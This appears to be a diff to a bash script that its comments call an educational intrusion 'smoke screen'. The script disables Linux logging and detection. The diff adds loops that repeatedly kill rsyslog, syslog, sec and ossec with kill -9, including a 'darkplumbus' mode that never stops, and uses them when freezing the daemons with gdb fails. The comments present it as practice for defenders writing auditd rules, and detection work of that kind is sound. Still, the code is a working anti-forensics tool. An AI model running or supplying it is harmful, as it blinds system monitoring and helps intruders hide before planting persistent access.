@@ -5,7 +5,7 @@
 
 # nasty demo script here for running a muck - for educational purposes.
 
-        # A good test of your (auditd, selinux, monit, filesystem firewall, virtualization) skills is to defend against it.
+          # A good test of your (auditd, selinux, monit, filesystem firewall, virtualization) skills is to defend against it.
           # Try to build an auditd configuration that can report 
           # plumbus-freezer type things (logging disabler).
           # So watching for the activity is easy enough with auditd, but the plumbus-freezer still 
@@ -39,14 +39,47 @@
 # Warning: This is not something you want for your system. This is like a smoke screen for Linux intrusion template.
 # Like the thing a bad guy might run before he installs the persistent threat.
 
+killloop () {
+resume=$((SECONDS+540))
+while [ $SECONDS -lt $resume ]; do
+  pkill -9 $target; 
+done &
+}
+
+dpkillloop () {
+while true; do
+  pkill -9 $target; 
+done &
+}
+
 freeze1 () {
-  pgrep -x rsyslog | xargs gdb -p || pkill -9 rsyslog 2>/dev/null
-  pgrep -x sec | xargs gdb -p || pkill -9 sec 2>/dev/null
-  pgrep -x ossec | xargs gdb -p || pkill -9 ossec 2>/dev/null
+  target=rsyslog
+  pgrep -x rsyslog | xargs gdb -p || killloop 2>/dev/null
+  target=sec
+  pgrep -x sec | xargs gdb -p || killloop 2>/dev/null
+  target=ossec
+  pgrep -x ossec | xargs gdb -p || killloop 2>/dev/null
 }
 
 freeze2 () {
-  pgrep -x syslog | xargs gdb -p || pkill -9 syslog 2>/dev/null
+  target=syslog
+  pgrep -x syslog | xargs gdb -p || killloop 2>/dev/null
+}
+
+# The darkplumbus freezes that don't stop.
+
+dpfreeze1 () {
+  target=rsyslog
+  pgrep -x rsyslog | xargs gdb -p || dpkillloop 2>/dev/null
+  target=sec
+  pgrep -x sec | xargs gdb -p || dpkillloop 2>/dev/null
+  target=ossec
+  pgrep -x ossec | xargs gdb -p || dpkillloop 2>/dev/null
+}
+
+dpfreeze2 () {
+  target=syslog
+  pgrep -x syslog | xargs gdb -p || dpkillloop 2>/dev/null
 }
 
 freeze3 () {
@@ -111,9 +144,9 @@ case "$1" in
     unfreeze
 ;;
   -darkplumbus)
-    freeze1 &
+    dpfreeze1 &
     cleanout &
-    freeze2 &
+    dpfreeze2 &
 #    freeze3 &
     freeze4 &
     freeze5 &
